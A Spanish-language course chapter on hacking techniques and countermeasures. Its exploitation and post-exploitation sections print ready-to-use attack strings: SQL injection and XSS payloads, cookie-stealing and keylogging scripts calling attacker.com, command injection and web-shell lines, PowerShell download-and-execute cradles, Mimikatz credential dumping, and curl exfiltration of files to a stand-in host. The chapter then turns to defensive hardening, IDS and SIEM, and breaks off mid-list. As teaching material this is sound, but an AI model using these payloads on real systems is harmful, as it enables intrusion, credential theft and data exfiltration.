# Tema 10: Técnicas de Hacking y Contramedidas

## Índice de Contenidos
1. [Técnicas de Hacking](#técnicas-de-hacking)
2. [Reconnaissance (Reconocimiento)](#reconnaissance-reconocimiento)
3. [Scanning y Enumeration](#scanning-y-enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation](#post-exploitation)
6. [Contramedidas a Ataques](#contramedidas-a-ataques)
7. [Herramientas de Defensa](#herramientas-de-defensa)
8. [Testing de Seguridad](#testing-de-seguridad)

---

## Técnicas de Hacking

### Definición de Hacking Ético vs Malicioso

#### Hacking Ético (Ethical Hacking)
El **hacking ético** es la práctica de atacar sistemas de información de manera legal y autorizada para identificar vulnerabilidades de seguridad antes de que sean explotadas por atacantes maliciosos.

**Características del Hacking Ético:**
- Autorización explícita del propietario del sistema
- Documentación completa de hallazgos
- Confidencialidad y profesionalismo
- Objetivo de mejorar la seguridad
- Cumplimiento de marcos legales y éticos

#### Hacking Malicioso (Black Hat)
```
Diferencias Fundamentales:
┌─────────────────────┬─────────────────────────────────┐
│ Hacking Ético       │ Hacking Malicioso               │
├─────────────────────┼─────────────────────────────────┤
│ Autorizado          │ No autorizado                   │
│ Legal               │ Ilegal                          │
│ Constructivo        │ Destructivo                     │
│ Documentado         │ Oculto                          │
│ Mejora seguridad    │ Explota vulnerabilidades        │
│ Responsabilidad     │ Anonimato                       │
└─────────────────────┴─────────────────────────────────┘
```

### Metodologías de Penetration Testing

#### PTES (Penetration Testing Execution Standard)
```
Fases PTES:
├── Pre-engagement Interactions
│   ├── Definición de alcance
│   ├── Reglas de engagement
│   └── Documentación legal
├── Intelligence Gathering
│   ├── OSINT collection
│   ├── Footprinting
│   └── Target identification
├── Threat Modeling
│   ├── Business asset analysis
│   ├── Threat capability modeling
│   └── Risk assessment
├── Vulnerability Analysis
│   ├── Vulnerability identification
│   ├── Validation testing
│   └── Research correlation
├── Exploitation
│   ├── Precision targeting
│   ├── Customized exploitation
│   └── Anti-forensics
├── Post Exploitation
│   ├── Infrastructure analysis
│   ├── Pillaging
│   └── Cleanup
└── Reporting
    ├── Executive summary
    ├── Technical details
    └── Remediation roadmap
```

#### OWASP Testing Guide
**Metodología OWASP:**
- Information Gathering
- Configuration and Deployment Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Input Validation Testing
- Error Handling
- Cryptography
- Business Logic Testing
- Client Side Testing

### Fases del Hacking

#### Ciclo de Vida del Ataque
```
Hacking Lifecycle:
1. Reconnaissance (Footprinting)
   └── Información pública del target
2. Scanning
   └── Identificación de servicios activos
3. Enumeration
   └── Extracción de información detallada
4. Gaining Access
   └── Explotación de vulnerabilidades
5. Maintaining Access
   └── Instalación de backdoors
6. Covering Tracks
   └── Eliminación de evidencias
```

#### Herramientas por Fase
```
Herramientas Comunes:
├── Reconnaissance
│   ├── Google Dorking
│   ├── Shodan
│   ├── Maltego
│   └── TheHarvester
├── Scanning
│   ├── Nmap
│   ├── Masscan
│   ├── Zmap
│   └── Unicornscan
├── Vulnerability Assessment
│   ├── Nessus
│   ├── OpenVAS
│   ├── Qualys
│   └── Rapid7 Nexpose
├── Exploitation
│   ├── Metasploit
│   ├── Cobalt Strike
│   ├── SQLmap
│   └── Burp Suite
└── Post-Exploitation
    ├── Empire
    ├── Meterpreter
    ├── Mimikatz
    └── BloodHound
```

---

## Reconnaissance (Reconocimiento)

### Passive Reconnaissance

#### OSINT (Open Source Intelligence)
La **inteligencia de fuentes abiertas** implica la recolección de información disponible públicamente sin interactuar directamente con el objetivo.

**Fuentes de Información Pública:**
```
OSINT Sources:
├── Public Websites
│   ├── Company websites
│   ├── Social media profiles
│   ├── Job postings
│   └── Press releases
├── Search Engines
│   ├── Google dorking
│   ├── Bing advanced search
│   ├── Specialized search engines
│   └── Cached pages
├── Public Databases
│   ├── WHOIS databases
│   ├── DNS records
│   ├── Certificate transparency
│   └── BGP routing tables
├── Social Networks
│   ├── LinkedIn profiles
│   ├── Facebook information
│   ├── Twitter posts
│   └── Professional networks
└── Technical Resources
    ├── Shodan IoT search
    ├── Censys internet scan
    ├── Archive.org snapshots
    └── Pastebin dumps
```

#### Google Dorking Techniques
**Operadores Avanzados:**
```bash
# Buscar archivos específicos en un dominio
site:ejemplo.com filetype:pdf

# Buscar directorios de índice
intitle:"Index of" site:ejemplo.com

# Buscar paneles de administración
inurl:admin site:ejemplo.com

# Buscar información en caché
cache:ejemplo.com

# Buscar páginas con errores SQL
intext:"sql syntax near" | intext:"syntax error has occurred"

# Buscar archivos de configuración
filetype:conf inurl:firewall

# Buscar credenciales expuestas
filetype:sql "MySQL dump" (pass|password|passwd|pwd)
```

#### Herramientas de OSINT
**TheHarvester:**
```bash
# Recolectar emails y subdominios
theHarvester -d ejemplo.com -l 500 -b google,bing,yahoo

# Búsqueda completa con múltiples fuentes
theHarvester -d ejemplo.com -l 500 -b all
```

**Maltego:**
- Análisis de relaciones entre entidades
- Mapeo visual de conexiones
- Transforms automáticos
- Correlación de información

### Active Reconnaissance

#### DNS Enumeration
**Técnicas de Enumeración DNS:**
```bash
# Consulta básica DNS
nslookup ejemplo.com

# Transferencia de zona
dig @dns-server ejemplo.com AXFR

# Enumeración de subdominios
dnsrecon -t brt -d ejemplo.com

# Búsqueda inversa
dig -x 192.168.1.1

# Registros específicos
dig ejemplo.com MX
dig ejemplo.com TXT
dig ejemplo.com NS
```

#### Network Mapping
**Descubrimiento de Red:**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# TCP SYN scan
nmap -sS 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1
```

### Social Engineering

#### Tipos de Social Engineering
```
Social Engineering Attacks:
├── Phishing
│   ├── Email phishing
│   ├── Spear phishing
│   ├── Whaling (CEO fraud)
│   └── Clone phishing
├── Pretexting
│   ├── Phone calls impersonation
│   ├── False scenarios
│   ├── Authority impersonation
│   └── Emergency situations
├── Baiting
│   ├── USB drops
│   ├── Malicious downloads
│   ├── Physical media
│   └── Software promises
├── Quid Pro Quo
│   ├── Technical support scams
│   ├── Survey participation
│   ├── Free services
│   └── Information exchange
└── Tailgating/Piggybacking
    ├── Physical access following
    ├── Badge sharing
    ├── Door holding
    └── Visitor impersonation
```

#### Footprinting de Organizaciones
**Información Objetivo:**
- Estructura organizacional
- Tecnologías utilizadas
- Empleados clave
- Políticas de seguridad
- Contactos de proveedores
- Ubicaciones físicas
- Horarios de operación

**Metodología de Footprinting:**
1. **Company Intelligence**: Información corporativa pública
2. **Network Intelligence**: Infraestructura de red
3. **System Intelligence**: Sistemas y aplicaciones
4. **Competitive Intelligence**: Análisis de competencia

---

## Scanning y Enumeration

### Network Scanning con Nmap

#### Tipos de Scan
```
Nmap Scan Types:
├── TCP Scans
│   ├── TCP SYN (-sS) - Stealth scan
│   ├── TCP Connect (-sT) - Full connection
│   ├── TCP ACK (-sA) - Firewall detection
│   ├── TCP Window (-sW) - Window scan
│   ├── TCP Maimon (-sM) - Maimon scan
│   └── TCP FIN/NULL/Xmas (-sF/-sN/-sX)
├── UDP Scans
│   └── UDP (-sU) - UDP port scan
├── Other Protocols
│   ├── IP Protocol (-sO)
│   └── SCTP Init (-sY)
└── Special Scans
    ├── List scan (-sL)
    ├── Ping scan (-sn)
    ├── No port scan (-sn)
    └── Version detection (-sV)
```

#### Técnicas Avanzadas de Nmap
```bash
# Scan sigiloso con evasión
nmap -sS -f -D RND:10 --source-port 53 target.com

# Detección de OS y servicios
nmap -A -T4 target.com

# Scripts NSE específicos
nmap --script vuln target.com
nmap --script smb-enum-shares target.com

# Scan de vulnerabilidades
nmap --script vuln,exploit target.com

# Evasión de firewalls
nmap -f --mtu 24 --scan-delay 1s target.com

# Scan zombie (idle scan)
nmap -sI zombie_host target.com
```

### Vulnerability Scanning

#### Herramientas de Vulnerability Assessment
**Nessus:**
```
Características Nessus:
├── Comprehensive vulnerability database
├── Network and web application scanning
├── Compliance checking
├── Configuration auditing
├── Malware detection
└── Reporting and remediation guidance

Tipos de Scan:
├── Basic Network Scan
├── Advanced Scan
├── Web Application Tests
├── Malware Scan
└── Policy Compliance
```

**OpenVAS:**
```bash
# Inicializar OpenVAS
openvas-setup

# Crear target
openvas-cli -u admin -w admin --xml="<create_target><name>Target</name><hosts>192.168.1.0/24</hosts></create_target>"

# Crear y ejecutar task
openvas-cli -u admin -w admin --xml="<create_task><name>Scan Task</name><target id='target_id'/><config id='config_id'/></create_task>"

# Ver resultados
openvas-cli -u admin -w admin --get-results
```

### Service Enumeration

#### Banner Grabbing
**Técnicas de Banner Grabbing:**
```bash
# Telnet banner grabbing
telnet target.com 80
GET / HTTP/1.0

# Netcat banner grabbing
nc target.com 25

# Nmap banner grabbing
nmap -sV --version-intensity 5 target.com

# Specific service enumeration
nmap -p 139,445 --script smb-os-discovery target.com
```

#### Enumeración de Servicios Específicos
**HTTP/HTTPS Enumeration:**
```bash
# Nikto web scanner
nikto -h http://target.com

# Dirb directory brute force
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Gobuster directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Whatweb technology detection
whatweb target.com
```

**SMB Enumeration:**
```bash
# SMB enumeration with enum4linux
enum4linux target.com

# SMB shares enumeration
smbclient -L //target.com

# NBT enumeration
nbtscan 192.168.1.0/24

# SMB version detection
smbver.sh target.com
```

**SNMP Enumeration:**
```bash
# SNMP walk
snmpwalk -c public -v2c target.com

# SNMP enumeration script
snmp-check target.com

# SNMP brute force community strings
onesixtyone -c community.txt target.com
```

---

## Exploitation

### Tipos de Exploits

#### Clasificación de Exploits
```
Exploit Classification:
├── By Target
│   ├── Local exploits (privilege escalation)
│   ├── Remote exploits (network-based)
│   ├── Web application exploits
│   └── Client-side exploits
├── By Method
│   ├── Buffer overflow
│   ├── Format string attacks
│   ├── SQL injection
│   ├── Cross-site scripting
│   └── Directory traversal
├── By Impact
│   ├── Denial of service
│   ├── Information disclosure
│   ├── Code execution
│   └── Privilege escalation
└── By Reliability
    ├── Reliable exploits
    ├── Unreliable exploits
    └── Proof of concept
```

### Buffer Overflow Attacks

#### Fundamentos del Buffer Overflow
Un **buffer overflow** ocurre cuando un programa escribe más datos en un buffer de los que puede contener, sobrescribiendo memoria adyacente.

**Tipos de Buffer Overflow:**
```
Buffer Overflow Types:
├── Stack-based Buffer Overflow
│   ├── Return address overwrite
│   ├── Function pointer overwrite
│   └── Exception handler overwrite
├── Heap-based Buffer Overflow
│   ├── Heap metadata corruption
│   ├── Function pointer overwrite
│   └── Virtual function table overwrite
└── Format String Vulnerabilities
    ├── Read from arbitrary memory
    ├── Write to arbitrary memory
    └── Denial of service
```

#### Explotación de Buffer Overflow
**Proceso de Explotación:**
1. **Crash Analysis**: Identificar el punto de overflow
2. **Offset Calculation**: Determinar offset exacto
3. **Bad Character Analysis**: Identificar caracteres prohibidos
4. **Return Address Control**: Controlar EIP/RIP
5. **Shellcode Injection**: Inyectar código malicioso
6. **Exploit Reliability**: Hacer exploit confiable

**Herramientas para Buffer Overflow:**
```bash
# Pattern generation
msf-pattern_create -l 1000

# Pattern offset
msf-pattern_offset -q 0x41414141

# Bad character detection
mona.py bytearray -cpb '\x00'

# JMP ESP finder
mona.py jmp -r esp
```

### SQL Injection

#### Tipos de SQL Injection
```
SQL Injection Types:
├── Union-based SQL Injection
│   ├── Error-based injection
│   ├── Boolean-based blind injection
│   └── Time-based blind injection
├── Error-based SQL Injection
│   ├── MySQL error messages
│   ├── MSSQL error messages
│   └── Oracle error messages
├── Boolean-based Blind SQL Injection
│   ├── True/False responses
│   ├── Content-length analysis
│   └── Response time analysis
└── Time-based Blind SQL Injection
    ├── Sleep() functions
    ├── Heavy queries
    └── DNS lookups
```

#### Técnicas de SQL Injection
**Manual SQL Injection:**
```sql
-- Authentication bypass
admin' --
admin' OR '1'='1' --

-- Union-based information gathering
' UNION SELECT 1,database(),version() --
' UNION SELECT 1,table_name,column_name FROM information_schema.columns --

-- Error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

-- Time-based blind injection
' AND (SELECT * FROM (SELECT SLEEP(5))x) --

-- Boolean-based blind injection
' AND (SELECT SUBSTRING(@@version,1,1))='5' --
```

**SQLmap Automation:**
```bash
# Basic SQL injection test
sqlmap -u "http://target.com/page.php?id=1"

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Table enumeration
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# Column enumeration
sqlmap -u "http://target.com/page.php?id=1" -D database -T table --columns

# Data dump
sqlmap -u "http://target.com/page.php?id=1" -D database -T table --dump

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

### Cross-Site Scripting (XSS)

#### Tipos de XSS
```
XSS Classification:
├── Reflected XSS (Non-persistent)
│   ├── URL parameter injection
│   ├── Form input reflection
│   └── HTTP header injection
├── Stored XSS (Persistent)
│   ├── Database storage
│   ├── File system storage
│   └── Log file injection
└── DOM-based XSS
    ├── Client-side script manipulation
    ├── URL fragment processing
    └── JavaScript property injection
```

#### Payloads XSS Comunes
```html
<!-- Basic XSS payload -->
<script>alert('XSS')</script>

<!-- Image tag XSS -->
<img src=x onerror=alert('XSS')>

<!-- Event handler XSS -->
<body onload=alert('XSS')>

<!-- JavaScript URL -->
javascript:alert('XSS')

<!-- Data URI XSS -->
data:text/html,<script>alert('XSS')</script>

<!-- SVG XSS -->
<svg onload=alert('XSS')>

<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

<!-- Keylogger XSS -->
<script>document.onkeypress = function(e) { fetch('http://attacker.com/log.php?key=' + String.fromCharCode(e.which)); }</script>
```

### Remote Code Execution

#### Command Injection
**Técnicas de Command Injection:**
```bash
# Basic command injection
; cat /etc/passwd
| cat /etc/passwd
&& cat /etc/passwd
|| cat /etc/passwd

# Blind command injection
; sleep 10
| ping -c 10 127.0.0.1

# Out-of-band command injection
; nslookup `whoami`.attacker.com
| curl http://attacker.com/$(whoami)
```

#### File Inclusion Vulnerabilities
**Local File Inclusion (LFI):**
```php
# Basic LFI
../../../etc/passwd
....//....//....//etc/passwd

# Null byte injection (PHP < 5.3)
../../../etc/passwd%00

# PHP wrapper exploitation
php://filter/convert.base64-encode/resource=config.php
data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

# Log poisoning
../../../var/log/apache2/access.log
```

**Remote File Inclusion (RFI):**
```php
# Basic RFI
http://attacker.com/shell.php
ftp://attacker.com/shell.php

# Data wrapper RFI
data://text/plain,<?php system($_GET['cmd']); ?>
```

---

## Post-Exploitation

### Privilege Escalation

#### Windows Privilege Escalation
**Técnicas Comunes:**
```
Windows Privilege Escalation:
├── Kernel Exploits
│   ├── MS16-032 (Secondary Logon Handle)
│   ├── MS17-017 (GDI Palette Objects)
│   └── MS15-051 (Client Copy Image)
├── Service Exploits
│   ├── Unquoted Service Paths
│   ├── Weak Service Permissions
│   └── Service Binary Hijacking
├── Registry Exploits
│   ├── AlwaysInstallElevated
│   ├── Registry AutoRuns
│   └── Weak Registry Permissions
├── Scheduled Tasks
│   ├── Weak File Permissions
│   ├── Missing Binary
│   └── PATH Interception
└── Token Manipulation
    ├── Token Impersonation
    ├── Token Duplication
    └── Process Hollowing
```

**Herramientas de Windows PrivEsc:**
```bash
# PowerUp enumeration
powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1'); Invoke-AllChecks"

# WinPEAS enumeration
winpeas.exe

# Sherlock exploit suggester
powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Sherlock.ps1'); Find-AllVulns"
```

#### Linux Privilege Escalation
**Vectores de Escalada:**
```
Linux Privilege Escalation:
├── Kernel Exploits
│   ├── Dirty COW (CVE-2016-5195)
│   ├── Overlayfs (CVE-2015-1328)
│   └── PwnKit (CVE-2021-4034)
├── SUID/SGID Files
│   ├── Custom SUID binaries
│   ├── Known vulnerable SUID
│   └── SUID binary hijacking
├── Sudo Misconfigurations
│   ├── Sudo -l enumeration
│   ├── Wildcard abuse
│   └── LD_PRELOAD exploitation
├── Cron Jobs
│   ├── Weak file permissions
│   ├── PATH manipulation
│   └── Wildcard injection
└── Service Exploits
    ├── Writable service files
    └── Environment variables
```

**Herramientas de Linux PrivEsc:**
```bash
# LinPEAS enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
linux-exploit-suggester.sh

# Enumerate SUID files
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Enumerate cron jobs
cat /etc/crontab
crontab -l
```

### Persistence Techniques

#### Windows Persistence
```
Windows Persistence Methods:
├── Registry Persistence
│   ├── Run/RunOnce keys
│   ├── Winlogon keys
│   ├── Boot Execute keys
│   └── Service entries
├── File System Persistence
│   ├── Startup folder
│   ├── System32 directory
│   ├── DLL hijacking
│   └── Image File Execution Options
├── Service Persistence
│   ├── Custom Windows services
│   ├── Service replacement
│   └── Service DLL hijacking
├── Scheduled Tasks
│   ├── System scheduled tasks
│   ├── User scheduled tasks
│   └── Hidden scheduled tasks
└── WMI Persistence
    ├── WMI Event Subscriptions
    └── WMI Providers
```

#### Linux Persistence
```
Linux Persistence Methods:
├── Cron Jobs
│   ├── System cron (/etc/crontab)
│   ├── User cron (crontab -e)
│   └── Anacron jobs
├── Init Scripts
│   ├── /etc/init.d/ scripts
│   ├── Systemd services
│   └── Upstart jobs
├── Shell Profiles
│   ├── ~/.bashrc
│   ├── ~/.bash_profile
│   └── /etc/profile
├── SSH Keys
│   ├── Authorized keys
│   └── SSH backdoors
└── Library Preloading
    ├── LD_PRELOAD
    └── Shared library hijacking
```

### Lateral Movement

#### Técnicas de Lateral Movement
```
Lateral Movement Techniques:
├── Credential-based Movement
│   ├── Pass-the-Hash (PtH)
│   ├── Pass-the-Ticket (PtT)
│   ├── Golden Ticket attacks
│   └── Silver Ticket attacks
├── Remote Access Techniques
│   ├── RDP (Remote Desktop Protocol)
│   ├── WinRM (Windows Remote Management)
│   ├── SSH (Secure Shell)
│   └── VNC (Virtual Network Computing)
├── Service Exploitation
│   ├── SMB exploitation
│   ├── WMI execution
│   ├── DCOM exploitation
│   └── PowerShell remoting
└── Living off the Land
    ├── PSExec alternatives
    └── Native OS tools
```

#### Herramientas de Lateral Movement
```bash
# Mimikatz credential extraction
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# CrackMapExec network scanning
crackmapexec smb 192.168.1.0/24 -u username -p password

# Impacket tools
psexec.py domain/username:password@target.com
smbexec.py domain/username:password@target.com
wmiexec.py domain/username:password@target.com

# BloodHound Active Directory mapping
SharpHound.exe -c All
```

### Data Exfiltration

#### Métodos de Exfiltración
```
Data Exfiltration Methods:
├── Network-based Exfiltration
│   ├── HTTP/HTTPS tunneling
│   ├── DNS tunneling
│   ├── FTP/SFTP transfer
│   └── Cloud storage upload
├── Physical Exfiltration
│   ├── USB devices
│   ├── CD/DVD burning
│   ├── Network attached storage
│   └── Mobile devices
├── Covert Channels
│   ├── Steganography
│   ├── Protocol tunneling
│   ├── Timing channels
│   └── Storage channels
└── Email Exfiltration
    ├── Webmail services
    └── SMTP tunneling
```

#### Herramientas de Exfiltración
```bash
# DNS tunneling with dnscat2
dnscat2-server attacker.com
dnscat2-client attacker.com

# HTTP tunneling
curl -X POST -F "file=@sensitive_data.txt" http://attacker.com/upload.php

# Base64 encoding for evasion
base64 sensitive_data.txt | curl -X POST -d @- http://attacker.com/data

# Steganography with steghide
steghide embed -cf image.jpg -ef secret.txt
```

---

## Contramedidas a Ataques

### Estrategias de Defensa en Profundidad

#### Modelo de Defensa en Capas
```
Defense in Depth Model:
┌─────────────────────────────────────────────────────┐
│                   Policies & Procedures             │
├─────────────────────────────────────────────────────┤
│                   Physical Security                  │
├─────────────────────────────────────────────────────┤
│                   Perimeter Defense                  │
├─────────────────────────────────────────────────────┤
│                   Network Security                   │
├─────────────────────────────────────────────────────┤
│                   Host-based Security                │
├─────────────────────────────────────────────────────┤
│                   Application Security               │
├─────────────────────────────────────────────────────┤
│                   Data Security                      │
└─────────────────────────────────────────────────────┘
```

#### Principios de Defensa
**Principios Fundamentales:**
- **Least Privilege**: Mínimos privilegios necesarios
- **Fail Secure**: Falla segura por defecto
- **Defense Diversity**: Múltiples tipos de controles
- **Simplicity**: Mantener soluciones simples
- **Complete Mediation**: Verificar todos los accesos

### Hardening de Sistemas

#### Windows Hardening
**Configuraciones de Seguridad:**
```
Windows Hardening Checklist:
├── User Account Control (UAC)
│   ├── Enable UAC for all users
│   ├── Configure UAC behavior
│   └── Require signed applications
├── Windows Firewall
│   ├── Enable firewall for all profiles
│   ├── Configure inbound rules
│   └── Log dropped connections
├── User Accounts
│   ├── Disable unnecessary accounts
│   ├── Rename Administrator account
│   ├── Complex password policy
│   └── Account lockout policy
├── Services
│   ├── Disable unnecessary services
│   ├── Change service accounts
│   └── Configure service dependencies
├── Registry Settings
│   ├── Disable autorun
│   ├── Secure boot settings
│   └── Network security settings
└── File System
    ├── NTFS permissions
    ├── Disable dangerous file types
    └── Configure audit settings
```

#### Linux Hardening
**Configuraciones de Seguridad:**
```
Linux Hardening Checklist:
├── System Updates
│   ├── Keep system updated
│   ├── Configure automatic updates
│   └── Security patches priority
├── User Management
│   ├── Remove unnecessary users
│   ├── Strong password policy
│   ├── Sudo configuration
│   └── User login monitoring
├── Network Security
│   ├── Disable unused services
│   ├── Configure iptables/firewall
│   ├── Secure SSH configuration
│   └── Network parameter tuning
├── File System Security
│   ├── Set proper permissions
│   ├── Configure umask
│   ├── Mount options security
│   └── File integrity monitoring
├── Logging and Monitoring
│   ├── Configure syslog
│   ├── Log rotation policy
│   ├── Monitor failed logins
│   └── System activity auditing
└── Kernel Security
    ├── Kernel parameter tuning
    ├── Disable unused modules
    └── SELinux/AppArmor configuration
```

### Patch Management

#### Proceso de Patch Management
```
Patch Management Process:
1. Inventory Management
   ├── Asset discovery
   ├── Software inventory
   ├── Vulnerability assessment
   └── Risk prioritization

2. Patch Acquisition
   ├── Vendor notifications
   ├── Security advisories
   ├── Patch download
   └── Verification

3. Testing and Evaluation
   ├── Test environment setup
   ├── Compatibility testing
   ├── Performance impact
   └── Rollback procedures

4. Deployment
   ├── Deployment scheduling
   ├── Staged deployment
   ├── Monitoring deployment
   └── Documentation

5. Verification
   ├── Patch verification
   ├── Functionality testing
   └── Security validation
```

#### Herramientas de Patch Management
**Soluciones Empresariales:**
- **Microsoft WSUS**: Windows Update Services
- **Red Hat Satellite**: Linux patch management
- **Qualys VMDR**: Vulnerability management
- **Rapid7 InsightVM**: Integrated vulnerability management

### Network Segmentation

#### Técnicas de Segmentación
```
Network Segmentation Strategies:
├── Physical Segmentation
│   ├── Separate network infrastructure
│   ├── Dedicated switches
│   └── Air-gapped networks
├── Logical Segmentation
│   ├── VLANs (Virtual LANs)
│   ├── Subnetting
│   ├── VRFs (Virtual Routing and Forwarding)
│   └── Software-defined networking
├── Micro-segmentation
│   ├── Application-level isolation
│   ├── Zero-trust architecture
│   ├── Container networking
│   └── Service mesh security
└── Perimeter Segmentation
    ├── DMZ (Demilitarized Zone)
    ├── Internal firewalls
    ├── Web application firewalls
    └── Proxy servers
```

#### Zero Trust Architecture
**Principios de Zero Trust:**
```
Zero Trust Principles:
├── Never Trust, Always Verify
│   ├── Verify every user
│   ├── Verify every device
│   └── Verify every request
├── Least Privileged Access
│   ├── Minimal access rights
│   ├── Just-in-time access
│   └── Regular access reviews
├── Assume Breach
│   ├── Continuous monitoring
│   ├── Incident response ready
│   └── Lateral movement prevention
└── Data-Centric Security
    ├── Data classification
    ├── Data encryption
    └── Data loss prevention
```

### Intrusion Detection Systems

#### Tipos de IDS
```
IDS Classification:
├── By Detection Method
│   ├── Signature-based (SIDS)
│   │   ├── Known attack patterns
│   │   ├── Fast detection
│   │   └── Low false positives
│   └── Anomaly-based (AIDS)
│       ├── Behavioral analysis
│       ├── Unknown attack detection
│       └── Higher false positives
├── By Deployment Location
│   ├── Network-based (NIDS)
│   │   ├── Network traffic analysis
│   │   ├── Multiple host monitoring
│   │   └── Limited encrypted traffic visibility
│   └── Host-based (HIDS)
│       ├── System log analysis
│       ├── File integrity monitoring
│       └── Local system focus
└── By Response Capability
    ├── Passive IDS (Detection only)
    └── Active IDS/IPS (Prevention capable)
```

#### Implementación de IDS/IPS
**Herramientas Open Source:**
```bash
# Suricata IPS installation
apt-get install suricata
suricata-update
systemctl start suricata

# Snort installation and configuration
apt-get install snort
snort -A console -q -c /etc/snort/snort.conf -i eth0

# OSSEC HIDS installation
wget https://github.com/ossec/ossec-hids/archive/master.tar.gz
./install.sh
```

**Configuración de Reglas:**
```bash
# Suricata rule example
alert tcp any any -> $HOME_NET 80 (msg:"HTTP GET Request"; content:"GET"; http_method; sid:1000001; rev:1;)

# Snort rule example
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH brute force attempt"; threshold:type both, track by_src, count 5, seconds 60; sid:1000002; rev:1;)
```

---

## Herramientas de Defensa

### SIEM (Security Information and Event Management)

#### Arquitectura SIEM
```
SIEM Architecture:
├── Data Collection Layer
│   ├── Log agents
│   ├── Network sensors
│   ├── API connectors
│   └── Database connectors
├── Data Processing Layer
│   ├── Log parsing
│   ├── Event normalization
│   ├── Correlation engine
│   └── Threat intelligence integration
├── Storage Layer
│   ├── Real-time data store
│   ├── Historical data archive
│   ├── Index management
│   └── Data compression
├── Analysis Layer
│   ├── Rule-based correlation
│   ├── Statistical analysis
│   ├── Machine learning
│   └── Behavioral analytics
└── Presentation Layer
    ├── Dashboards
    ├── Alerting
    ├── Reporting
    └── Investigation tools
```

#### Soluciones SIEM Populares
**Comerciales:**
- **Splunk**: Análisis de datos masivos
- **QRadar**: Correlación avanzada de eventos
- **ArcSight**: Gestión de eventos empresariales
- **LogRhythm**: SIEM con SOAR integrado

**Open Source:**
```bash
# ELK Stack installation
# Elasticsearch
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
apt-get update && apt-get install elasticsearch

# Logstash
apt-get install logstash

# Kibana
apt-get install kibana

# OSSIM installation
wget https://cybersecurity.att.com/products/ossim/download
dpkg -i ossim-installer.deb
```

### Antimalware Avanzado

#### Next-Generation Antivirus (NGAV)
**Capacidades Avanzadas:**
```
NGAV Capabilities:
├── Machine Learning Detection
│   ├── Behavioral analysis
│   ├── Static file analysis
│   ├── Dynamic execution analysis
│   └── Ensemble methods
├── Threat Intelligence Integration
│   ├── Global threat feeds
│   ├── Reputation scoring
│   ├── IOC matching
│   └── Attribution tracking
├── Memory Protection
│   ├── Exploit mitigation
│   ├── Return-oriented programming protection
│   ├── Heap spray protection
│   └── Stack protection
└── Cloud-based Analysis
    ├── Sandboxing services
    ├── Threat hunting
    ├── Global intelligence
    └── Real-time updates
```

#### Endpoint Detection and Response (EDR)
**Funcionalidades EDR:**
- Continuous endpoint monitoring
- Advanced threat detection
- Incident investigation capabilities
- Automated response actions
- Threat hunting support
- Forensic data collection

### Network Access Control (NAC)

#### Componentes NAC
```
NAC Components:
├── Policy Decision Point (PDP)
│   ├── Authentication policies
│   ├── Authorization rules
│   ├── Compliance requirements
│   └── Risk assessment
├── Policy Enforcement Point (PEP)
│   ├── Network switches
│   ├── Wireless access points
│   ├── VPN gateways
│   └── Firewall integration
├── Policy Information Point (PIP)
│   ├── User directories
│   ├── Asset databases
│   ├── Vulnerability scanners
│   └── Threat intelligence
└── Policy Administration Point (PAP)
    ├── Policy management interface
    ├── Configuration tools
    ├── Reporting capabilities
    └── Audit trails
```

#### Implementación NAC
**Modos de Despliegue:**
- **Inline Mode**: Control directo del tráfico
- **Out-of-band Mode**: Monitoreo y enforcement indirecto
- **Agent-based**: Software client en endpoints
- **Agentless**: Sin software adicional en endpoints

---

## Testing de Seguridad

### Vulnerability Assessments

#### Proceso de Vulnerability Assessment
```
Vulnerability Assessment Process:
1. Planning and Scoping
   ├── Define assessment scope
   ├── Identify target systems
   ├── Select testing methodology
   └── Obtain authorization

2. Information Gathering
   ├── Asset discovery
   ├── Service enumeration
   ├── Technology identification
   └── Architecture mapping

3. Vulnerability Identification
   ├── Automated scanning
   ├── Manual verification
   ├── Configuration review
   └── Code analysis

4. Risk Analysis
   ├── Vulnerability validation
   ├── Impact assessment
   ├── Likelihood evaluation
   └── Risk rating assignment

5. Reporting
   ├── Executive summary
   ├── Technical findings
   ├── Risk prioritization
   └── Remediation recommendations
```

#### Herramientas de Vulnerability Assessment
**Escáneres de Red:**
```bash
# Nessus vulnerability scan
nessuscli scan new --template="basic" --name="Network Scan" --targets="192.168.1.0/24"

# OpenVAS scan
openvas-start
omp -u admin -w admin -T --xml="<create_task><name>VA Scan</name></create_task>"

# Qualys scan (cloud-based)
curl -u "username:password" -H "Content-type: application/xml" -X "POST" --data-binary @scan_config.xml "https://qualysapi.qualys.com/api/2.0/fo/scan/"
```

### Penetration Testing

#### Metodología de Penetration Testing
```
Penetration Testing Phases:
1. Pre-engagement
   ├── Scope definition
   ├── Rules of engagement
   ├── Legal agreements
   └── Testing windows

2. Reconnaissance
   ├── Passive information gathering
   ├── Active reconnaissance
   ├── Social engineering assessment
   └── Physical security evaluation

3. Scanning and Enumeration
   ├── Port scanning
   ├── Service enumeration
   ├── Vulnerability identification
   └── Target prioritization

4. Exploitation
   ├── Vulnerability exploitation
   ├── Post-exploitation activities
   ├── Privilege escalation
